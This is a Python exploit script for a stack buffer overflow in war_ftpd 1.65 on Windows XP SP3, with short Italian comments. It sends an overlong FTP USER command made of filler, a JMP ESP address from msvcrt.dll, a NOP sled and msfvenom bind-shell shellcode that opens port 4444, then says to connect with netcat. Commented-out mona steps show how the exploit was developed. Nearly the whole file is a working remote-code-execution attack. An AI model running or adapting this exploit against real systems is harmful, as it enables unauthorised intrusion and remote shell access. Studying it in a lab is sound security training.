#!/usr/bin/python

'''
 war_ftpd 1.65 
 win xp sp3 
 aggiorna il 24.05 09:53
'''
import socket

#TO BE CONFIGURED
HOST = "192.168.1.106"
PORT = 1121

#buffer = "X" * 1000

#create from mona module: !mona pattern_create 1000
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

#this exactly the len of the bof (485) to get the stack aligned: command: !mona findmsp
#buffer = "X" * 485 + "A" * 4 + "\x90" * 16 # the nop op code (x90) is injected 4 bytes before esp starts

#find the JMP ESP or equivalent: !mona jmp -r esp then I use msvcrt.dll since should not changed due to windows update
#addr found: 77 c3 54 b4 = push esp # ret
#buffer = "X" * 485 + "\xb4\x54\xc3\x77" + "\x90" * 16 

#shellcode generated with: msfvenom -p windows/shell_bind_tcp -b '\x00\x40\x0a\x0d' -f py
#default port 4444 
buf =  ""
buf += "\xbd\x3e\xa7\x9c\x21\xda\xd8\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x53\x31\x6b\x12\x03\x6b\x12\x83\xd5\x5b\x7e"
buf += "\xd4\xd5\x4c\xfd\x17\x25\x8d\x62\x91\xc0\xbc\xa2\xc5"
buf += "\x81\xef\x12\x8d\xc7\x03\xd8\xc3\xf3\x90\xac\xcb\xf4"
buf += "\x11\x1a\x2a\x3b\xa1\x37\x0e\x5a\x21\x4a\x43\xbc\x18"
buf += "\x85\x96\xbd\x5d\xf8\x5b\xef\x36\x76\xc9\x1f\x32\xc2"
buf += "\xd2\x94\x08\xc2\x52\x49\xd8\xe5\x73\xdc\x52\xbc\x53"
buf += "\xdf\xb7\xb4\xdd\xc7\xd4\xf1\x94\x7c\x2e\x8d\x26\x54"
buf += "\x7e\x6e\x84\x99\x4e\x9d\xd4\xde\x69\x7e\xa3\x16\x8a"
buf += "\x03\xb4\xed\xf0\xdf\x31\xf5\x53\xab\xe2\xd1\x62\x78"
buf += "\x74\x92\x69\x35\xf2\xfc\x6d\xc8\xd7\x77\x89\x41\xd6"
buf += "\x57\x1b\x11\xfd\x73\x47\xc1\x9c\x22\x2d\xa4\xa1\x34"
buf += "\x8e\x19\x04\x3f\x23\x4d\x35\x62\x2c\xa2\x74\x9c\xac"
buf += "\xac\x0f\xef\x9e\x73\xa4\x67\x93\xfc\x62\x70\xd4\xd6"
buf += "\xd3\xee\x2b\xd9\x23\x27\xe8\x8d\x73\x5f\xd9\xad\x1f"
buf += "\x9f\xe6\x7b\xb5\x97\x41\xd4\xa8\x5a\x31\x84\x6c\xf4"
buf += "\xda\xce\x62\x2b\xfa\xf0\xa8\x44\x93\x0c\x53\x7b\x38"
buf += "\x98\xb5\x11\xd0\xcc\x6e\x8d\x12\x2b\xa7\x2a\x6c\x19"
buf += "\x9f\xdc\x25\x4b\x18\xe3\xb5\x59\x0e\x73\x3e\x8e\x8a"
buf += "\x62\x41\x9b\xba\xf3\xd6\x51\x2b\xb6\x47\x65\x66\x20"
buf += "\xeb\xf4\xed\xb0\x62\xe5\xb9\xe7\x23\xdb\xb3\x6d\xde"
buf += "\x42\x6a\x93\x23\x12\x55\x17\xf8\xe7\x58\x96\x8d\x5c"
buf += "\x7f\x88\x4b\x5c\x3b\xfc\x03\x0b\x95\xaa\xe5\xe5\x57"
buf += "\x04\xbc\x5a\x3e\xc0\x39\x91\x81\x96\x45\xfc\x77\x76"
buf += "\xf7\xa9\xc1\x89\x38\x3e\xc6\xf2\x24\xde\x29\x29\xed"
buf += "\xee\x63\x73\x44\x67\x2a\xe6\xd4\xea\xcd\xdd\x1b\x13"
buf += "\x4e\xd7\xe3\xe0\x4e\x92\xe6\xad\xc8\x4f\x9b\xbe\xbc"
buf += "\x6f\x08\xbe\x94"

#        overflow eip          jmp esp          accomodate sc
buffer = "X" * 485     +   "\xb4\x54\xc3\x77" +  "\x90" * 16    +  buf

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((HOST,PORT)) # TO BE CONFIGURED 

response = s.recv(1024) #grab the banner
print response 

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)

print response
s.send('PASS PASSWORD\r\n')
s.close()

#try to get a shell: nc HOST 4444
